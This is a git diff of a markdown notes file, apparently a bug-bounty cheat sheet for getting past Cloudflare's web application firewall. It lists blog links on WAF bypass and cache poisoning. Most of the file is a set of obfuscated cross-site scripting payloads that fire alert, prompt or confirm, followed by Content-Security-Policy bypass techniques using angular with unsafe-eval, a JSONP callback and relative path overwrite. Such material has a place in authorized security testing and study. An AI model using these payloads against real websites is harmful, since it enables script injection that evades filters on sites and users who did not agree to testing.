@@ -1,15 +1,16 @@
 Hello there,
-Its still undergoing updates. 
+Its still undergoing updates.
 
-Cloudflare 
+Cloudflare
 
-#Check Endpoints 
-	Check from Documentaion : https://github.com/cloudflare/cloudflare-docs
+# Check Endpoints
 
-#Check for misconfigurations : 
+ Check from Documentaion : https://github.com/cloudflare/cloudflare-docs
 
+# Check for misconfigurations :
 
-#Must check links to visit 
+# Must check links to visit
+
 1. https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9
 2. https://medium.com/@the_harvester/bypassed-cloudflares-web-application-firewall-waf-44da57f3a1d3
 3. https://ltsirkov.medium.com/cross-site-scripting-via-web-cache-poisoning-and-waf-bypass-6cb3412d9e11
@@ -21,8 +22,7 @@ Cloudflare
 9. https://systemweakness.com/how-i-bypassed-cloudflare-waf-to-get-my-first-bug-f02dab3a2d10
 10. https://systemweakness.com/automate-and-finds-the-ip-address-of-a-website-behind-cloudflare-45db99510b4b
 
-
-#Some payloads 
+# Some payloads
 
 <svg%0Aonauxclick=0;[1].some(confirm)//
 
@@ -49,25 +49,24 @@ Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
 
 "Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))
 
-For more EDR and WAF 
+For more EDR and WAF
 
 https://youtube.com/@LinuxbyVikku
 
-
 1. Third Party Endpoints + ('unsafe-eval')
-Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval'; 
+Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
 
-2. Third Party Endpoints + JSONP
+1. Third Party Endpoints + JSONP
 Content-Security-Policy: script-src 'self' https://google.com https://youtube.com; object-src 'none';
 "><script src="https://google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
 
-3. Third Party Abuses
+2. Third Party Abuses
 Content-Security-Policy​: default-src 'self’ http://facebook.com;​
 Content-Security-Policy​: connect-src http://facebook.com;​
 
-4. Bypass via RPO (Relative Path Overwrite)
+3. Bypass via RPO (Relative Path Overwrite)
 For example, if CSP allows the path https://example.com/scripts/react/, it can be bypassed as follows:
+
 <script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
-
-
